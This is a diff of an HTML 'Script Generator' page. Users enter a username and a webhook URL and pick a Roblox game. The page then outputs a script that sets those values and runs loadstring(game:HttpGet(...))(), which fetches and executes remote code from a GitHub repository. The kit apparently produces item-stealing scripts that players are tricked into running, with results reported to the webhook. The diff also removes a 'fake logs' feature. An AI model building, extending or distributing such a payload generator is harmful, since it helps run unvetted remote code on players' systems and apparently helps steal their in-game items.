@@ -22,127 +22,62 @@
         }
         .container {
             display: flex;
+            flex-direction: column;
             gap: 15px;
             margin-top: 20px;
+            text-align: center;
+        }
+        input, select, button {
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 1rem;
+            width: 250px;
         }
         button {
             background: #ff0080;
-            padding: 10px 20px;
-            border-radius: 8px;
             cursor: pointer;
             transition: 0.3s;
-            font-size: 1rem;
         }
         button:hover {
             background: #ff0055;
             transform: scale(1.1);
         }
-        /* Log Section Styles */
-        #log-section {
-            margin-top: 20px;
-            padding: 10px;
+        /* Script Output Box */
+        #generated-script {
+            display: none;
             background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            margin-top: 20px;
             max-width: 80%;
             width: 100%;
-            text-align: center;
         }
-        #log-section ul {
-            list-style-type: none;
-            padding: 0;
-            margin: 0;
-        }
-        #log-section li {
-            margin: 10px;
-        }
-        /* Script Generation Popup Styles */
-        .popup {
-            display: none;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-        }
-        .popup input, .popup select {
-            margin: 10px auto;
-            padding: 10px;
-            width: 80%;
-            border-radius: 8px;
-            border: none;
-            background-color: #333;
-            color: white;
-        }
-        .popup button {
-            background: #ff0080;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: 0.3s;
-        }
-        .popup button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
-        }
-        /* Generated Script Display */
-        #generated-script {
-            margin-top: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+        textarea {
             width: 100%;
-            max-width: 600px;
-            text-align: left;
-            word-wrap: break-word;
-            font-family: 'Courier New', Courier, monospace;
-        }
-        #generated-script pre {
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            height: 100px;
+            background: #222;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
             font-size: 1rem;
-            margin: 0;
-        }
-        #copy-btn {
-            margin-top: 10px;
-            background: #ff0080;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-            font-size: 1rem;
-        }
-        #copy-btn:hover {
-            background: #ff0055;
-            transform: scale(1.1);
+            resize: none;
         }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
 
-    <!-- Username Input and Login Button -->
-    <div id="login-section">
-        <input type="text" id="username" placeholder="Enter Username">
-        <button id="login-button" onclick="login()">Login</button>
-    </div>
-
-    <!-- Log Section -->
-    <div id="log-section" style="display:none;">
-        <h2>Login Log</h2>
-        <ul id="log-list"></ul>
-    </div>
-
-    <!-- Script Generation Popup -->
-    <div id="popup" class="popup" style="display:none;">
-        <h2>Enter Details</h2>
-        <input type="text" id="user-name" placeholder="Username" disabled>
-        <input type="text" id="webhook" placeholder="Webhook URL">
+    <div id="login-container" class="container">
+        <input type="text" id="username" placeholder="Enter your Username">
+        <input type="text" id="webhook" placeholder="Enter Webhook URL">
         
-        <!-- Script Selection Dropdown -->
+        <!-- Script Selection -->
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
             <option value="Murder Mystery 2">Murder Mystery 2</option>
@@ -152,17 +87,16 @@
         </select>
         
         <button onclick="generateScript()">Generate Script</button>
-        <button onclick="closePopup()">Close</button>
     </div>
 
-    <!-- Generated Script Section -->
-    <div id="generated-script" style="display:none;">
-        <pre id="script-output"></pre>
-        <button id="copy-btn" onclick="copyScript()">Copy All</button>
+    <!-- Script Output Section -->
+    <div id="generated-script">
+        <h2>Your Script</h2>
+        <textarea id="script-output" readonly></textarea>
+        <button onclick="copyScript()">Copy All</button>
     </div>
 
     <script>
-        let userInfo = null;
         let loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
             "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
@@ -171,69 +105,29 @@
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
-        // Login function (no authentication required)
-        function login() {
-            let usernameInput = document.getElementById('username').value;
-            if (usernameInput) {
-                userInfo = { username: usernameInput }; // Store the username
-                displayLoginInfo();
-                logVisit();
-                openPopup();
-                document.getElementById('login-section').style.display = 'none'; // Hide login section after login
-            } else {
-                alert("Please enter a username!");
-            }
-        }
-
-        // Display username in the popup
-        function displayLoginInfo() {
-            document.getElementById('user-name').value = userInfo.username;
-        }
-
-        // Open script generation popup
-        function openPopup() {
-            document.getElementById('popup').style.display = 'block';
-        }
-
-        // Close the popup
-        function closePopup() {
-            document.getElementById('popup').style.display = 'none';
-        }
-
-        // Generate script logic
         function generateScript() {
+            let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
             let selectedScript = document.getElementById('script-select').value;
 
-            if (webhook) {
-                let script = `Username = "${userInfo.username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
-                document.getElementById('script-output').innerText = script;
-                document.getElementById('generated-script').style.display = 'block'; // Show generated script section
-                closePopup();
-            } else {
-                alert("Please provide a webhook URL!");
+            if (!username || !webhook) {
+                alert("Please enter both Username and Webhook URL!");
+                return;
             }
+
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;
+            document.getElementById('script-output').value = script;
+            document.getElementById('generated-script').style.display = 'block';
+
+            // Hide login container after generating
+            document.getElementById('login-container').style.display = 'none';
         }
 
-        // Log user's visit (fake logs)
-        function logVisit() {
-            const logList = document.getElementById('log-list');
-            const logItem = document.createElement('li');
-            logItem.innerText = `New login: ${userInfo.username} | ${new Date().toLocaleTimeString()}`;
-            logList.appendChild(logItem);
-
-            // Show the log section if hidden
-            document.getElementById('log-section').style.display = 'block';
-        }
-
-        // Copy the generated script to clipboard
         function copyScript() {
-            const scriptText = document.getElementById('script-output').innerText;
-            navigator.clipboard.writeText(scriptText).then(() => {
-                alert("Script copied to clipboard!");
-            }).catch(err => {
-                console.error('Failed to copy script: ', err);
-            });
+            let scriptText = document.getElementById('script-output');
+            scriptText.select();
+            document.execCommand("copy");
+            alert("Script copied to clipboard!");
         }
     </script>
 </body>
